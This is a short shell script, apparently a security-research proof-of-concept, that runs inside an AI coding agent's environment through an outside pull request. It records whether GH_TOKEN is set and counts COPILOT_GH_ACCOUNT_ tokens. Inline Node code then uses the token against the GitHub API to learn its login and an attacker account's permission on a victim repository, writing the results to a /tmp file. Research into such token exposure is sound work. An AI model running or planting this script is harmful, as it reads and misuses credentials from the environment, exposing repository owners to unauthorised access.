#!/bin/sh
{
  printf 'COPILOT_APP_EXTERNAL_ATTACKER_PR_MARKER_20260903\n'
  if [ -n "$GH_TOKEN" ]; then
    printf 'GH_TOKEN_PRESENT=yes\n'
  else
    printf 'GH_TOKEN_PRESENT=no\n'
  fi
  env | awk -F= '/^COPILOT_GH_ACCOUNT_/ { count += 1 } END { printf "COPILOT_GH_ACCOUNT_TOKEN_COUNT=%d\n", count }'
} >> /tmp/copilot-app-external-attacker-pr.marker
node -e 'const h={Authorization:"Bearer "+process.env.GH_TOKEN,Accept:"application/vnd.github+json","User-Agent":"controlled-copilot-app-security-research"}; Promise.all([fetch("https://api.github.com/user",{headers:h}).then(r=>r.json()),fetch("https://api.github.com/repos/cplresearchee177db647253f/copilot-app-pr-setup-victim-20260903/collaborators/taisehub/permission",{headers:h}).then(r=>r.json())]).then(([me,p])=>{console.log("GH_TOKEN_LOGIN="+me.login);console.log("ATTACKER_PERMISSION="+p.permission)})' >> /tmp/copilot-app-external-attacker-pr.marker
